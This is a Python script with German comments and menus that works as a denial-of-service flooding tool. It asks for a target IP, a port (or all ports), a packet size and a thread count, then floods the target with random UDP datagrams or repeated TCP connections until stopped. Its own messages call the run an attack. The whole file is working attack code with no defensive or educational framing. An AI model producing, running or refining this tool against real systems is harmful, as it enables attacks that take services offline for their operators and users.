import os
import random
import socket
import threading
import time

# Globale Variablen
packet_counter = 0
stop_event = threading.Event()
print_lock = threading.Lock()

# Banner mit Anpassungsmöglichkeiten
def show_banner(color):
    os.system("clear")
    print(f"{color}")
    print("""
██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██████╔╝██████╔╝██║   ██║█████╗  
██╔═══╝ ██╔═══╝ ██║   ██║██╔══╝  
██║     ██║     ╚██████╔╝███████╗
╚═╝     ╚═╝      ╚═════╝ ╚══════╝
    """)
    print("\033[0m")

# UDP Flood
def udp_flood(ip, port, packet_size):
    global packet_counter
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_bytes = random._urandom(packet_size)
    while not stop_event.is_set():
        try:
            if port == -1:
                port = random.randint(1, 63350)
            sock.sendto(udp_bytes, (ip, port))
            packet_counter += 1
            with print_lock:
                print(f"Gesendet {packet_counter} UDP-Pakete an {ip} über Port {port}")
        except:
            pass

# TCP Flood
def tcp_flood(ip, port, packet_size):
    global packet_counter
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if port == -1:
                port = random.randint(1, 63350)
            sock.connect((ip, port))
            sock.send(random._urandom(packet_size))
            packet_counter += 1
            with print_lock:
                print(f"Gesendet {packet_counter} TCP-Pakete an {ip} über Port {port}")
        except:
            pass
        finally:
            sock.close()

# Menü zur Farbauswahl
def choose_color():
    print("1 - Rot")
    print("2 - Grün")
    print("3 - Blau")
    print("4 - Standard")
    choice = input("Wähle eine Farbe: ")
    return {
        "1": "\033[91m",
        "2": "\033[92m",
        "3": "\033[94m",
        "4": "\033[0m",
    }.get(choice, "\033[0m")

# Hauptprogramm
if __name__ == "__main__":
    color = choose_color()
    show_banner(color)

    while True:
        print("1 - UDP Flood")
        print("2 - TCP Flood")
        print("3 - Beenden")
        choice = input("Wähle eine Option: ")

        if choice in ["1", "2"]:
            ip = input("Ziel-IP-Adresse: ")
            port = int(input("Ziel-Port (-1 für alle Ports): "))
            packet_size = int(input("Paketgröße in Bytes: "))
            num_threads = int(input("Anzahl der Threads: "))

            attack_function = {
                "1": udp_flood,
                "2": tcp_flood,
            }.get(choice)

            stop_event.clear()
            threads = [
                threading.Thread(target=attack_function, args=(ip, port, packet_size))
                for _ in range(num_threads)
            ]
            for thread in threads:
                thread.daemon = True
                thread.start()

            input("\n[INFO] Drücke ENTER, um den Angriff zu stoppen.\n")
            stop_event.set()
            for thread in threads:
                thread.join()
            print("\n[INFO] Angriff gestoppt.")

        elif choice == "3":
            print("[INFO] Programm beendet.")
            sys.exit()
